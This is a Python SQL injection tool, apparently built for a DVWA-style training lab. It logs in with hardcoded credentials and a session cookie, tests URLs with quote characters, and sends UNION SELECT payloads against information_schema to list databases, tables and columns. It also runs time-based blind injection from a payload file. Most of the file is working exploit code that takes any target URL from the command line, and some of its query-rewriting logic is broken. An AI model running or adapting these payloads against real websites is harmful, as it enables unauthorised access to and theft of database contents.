#Referenced from https://www.thepythoncode.com/article/sql-injection-vulnerability-detector-in-python


import requests 
from bs4 import BeautifulSoup as bs
import urllib.parse
from pprint import pprint
import argparse
from random import randint
import re
import urllib.request
import socket

# Session creation
s = requests.Session()

# Session Headers and Cookie
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
s.headers["Cookie"] = "PHPSESSID=h14npt5i1d1rq4dpuuiuigiqb1; security=low"

#Argumment parser, We take input from user 
parser = argparse.ArgumentParser(prog='Sql_tool')
parser.add_argument('--url',metavar='url',type=str,action='store', required=True)
parser.add_argument('-t','--tables',metavar='tables',type=str,action='store')
parser.add_argument('-db','--database',metavar='database',type=str,action='store')
parser.add_argument('-c','--column',metavar='column',type=str,action='store')
parser.add_argument('-b','--blindsql',metavar='blindsql',type=str,action='store')
args = parser.parse_args()

# A basic version of our tool hence payload is being given explicitly
login_payload = {
     "username": "admin",
     "password": "password",
     "Login": "Login",
     "Cookie": "PHPSESSID=h14npt5i1d1rq4dpuuiuigiqb1; security=low"
      }

# Finding the domain to get the login page 
url = urllib.parse.urlparse(args.url)
dom = socket.gethostbyname(url.netloc)
login_url = url._replace(path = '/login.php')
login_url = urllib.parse.urlunparse(login_url)
print("[+]Domain is: ",dom,"[+] Logging into.. : ", login_url,sep='\n')

#r = s.get(login_url)
# r1 = s.post(login_url, data=login_payload)
# print(r1.content.decode())


# To access forms on the current page we access as per thr url entered
def get_forms(url):

    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")




# To get all input fields and information about the form
def get_form_inputs(form):

    formContent = {}
    # get the form action (target url)
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None

    # the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()

    # input tags  which inclues type and name
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
        
    formContent["action"] = action
    formContent["method"] = method
    formContent["inputs"] = inputs
    return formContent



# Prints the resulting output for various flags as given by user
def output(resp):

    sp = bs(resp.content.decode(), "html.parser")
    pre_tag = sp.find_all("pre")
    for pre in pre_tag:
        print(pre)



# Scanning the URL and checking if parameter is vulnerable
def scan_url(url,query):

    forms = get_forms(url)
    for form in forms:

        form_fields = get_form_inputs(form)
        data = {}

        for input_tag in form_fields["inputs"]:

            if input_tag["type"] == "hidden" or input_tag["value"]:

                try:
                    data[input_tag["name"]] = input_tag["value"]
                except:
                    pass

            elif input_tag["type"] != "submit":

                    data[input_tag["name"]] = query

                    data1 = urllib.parse.urlencode(data)

     # joining the url with the action (form request URL)
    url = urllib.parse.urljoin(url, form_fields["action"])
    if form_fields["method"] == "post":
        res = s.post(url, data=data)
        return res

    elif form_fields["method"] == "get":
        res = s.get(url, params=data) 
        return res



# Recording possible errors and if encountered return true
def iserr(resp):
    error = {"The used SELECT statements have a different number of columns", "you have an error in your sql syntax;", "warning: mysql"}

    for  i in error:   
        if i in resp.content.decode().lower():
            return True



# While the -db flag is true, this function checks for the databases of web application
def database(url):
    param = 2
    query = "' Union select table_schema from information_schema.tables union select '7"

    while param:

        if param == 1:
             #query = "' Union select table_schema from information_schema.tables union select '7"
            resp = scan_url(url,query)
            if not iserr(resp):
                break
            
        elif param == 2:
            query = "' Union select 3,table_schema from information_schema.tables union select 6,'7"
            resp = scan_url(url,query)
            if not iserr(resp):
                break


        else: 
            ls1 = (query.lower()).split()
            ind = ls1.index('from')
            ls1 = ls1.insert(ind,', 6')
            ind2 = len(ls1) - 1 - ls1[::-1].index('select')
            ls1.insert(ind2,',6 ')
            query = ''.join(ls1)
            resp = scan_url(url,query)
            if not iserr(resp):
                break
        param += 1
    print('[+] The Databases are: ')
    output(resp)
    


# While the -t flag is true, this function checks for the tables in corresponding database of web application
def tables(url,db):

    param = 1
    query = f"' Union select 3, table_name from information_schema.tables where table_schema = \'{db}\' union select 6,'7"

    while param:  

        if param == 1:
                resp = scan_url(url,query)
                if not iserr(resp):
                    break

        elif param == 2:
                query = f"' Union select 3,table_name from information_schema.tables where table_schema = \'{db}\' union select 6,'7"
                resp = scan_url(url,query)
                if not iserr(resp):
                    break

        else: 
            ls1 = (query.lower()).split()
            ind = ls1.index('from')
            ls1 = ls1.insert(ind,', 6')
            ind2 = len(ls1) - 1 - ls1[::-1].index('select')
            ls1.insert(ind2,',6 ')
            query = ''.join(ls1)
            resp = scan_url(url,query)
            if not iserr(resp):
                break 
        param += 1
    print('[+] The Tables are: ')
    output(resp)

 
	
# While the -c flag is true, this function checks for the columns in the corresponding table
def columns(url,tb):

    param = 2
    query = f"' Union select column_name from information_schema.tables where table_name = \'{tb}\' union select '7"

    while param:        
        if param == 1: 
                resp = scan_url(url,query)
                if not iserr(resp):
                    break
                
        elif param == 2:
                query = f"' Union select 3, column_name from information_schema.tables where table_name = \'{tb}\' union select 6,'7"
                resp = scan_url(url,query)
                if not iserr(resp):
                    break

        else: 
            ls1 = (query.lower()).split()
            ind = ls1.index('from')
            ls1 = ls1.insert(ind,', 6')
            ind2 = len(ls1) - 1 - ls1[::-1].index('select')
            ls1.insert(ind2,',6 ')
            query = ''.join(ls1)
            resp = scan_url(url,query)
            if not iserr(resp):
                break
        param += 1
    output(resp)


# Performs blind sql based on the injections given in payload file
def blindsql(url):

    fin = open("payloads.txt", "r")
    lines = fin.readlines()

    for line in lines:
        data = line.strip()
        resp = scan_url(url,data)
        
        if resp.elapsed.total_seconds()>0.1:           
            print("query:",data)
            output(resp)        
    fin.close()

    
# Checks for entered url and corresponding flag 
if args.url:
    if args.database:
        database(args.url)

    elif args.tables:
        tables(args.url,args.tables)

    elif args.column:
        columns(args.url,args.column)

    elif args.blindsql:
        blindsql(args.url)

    else:
        for c in "\"'":
            new_url = f"{args.url}{c}"

            print("[!] Trying", new_url)

            res = s.get(new_url)
            
            if iserr(res):
            
                print("[!] URL is vulnerable:",args.url)


else:

    print("[!] URL not given")
    exit(0)



    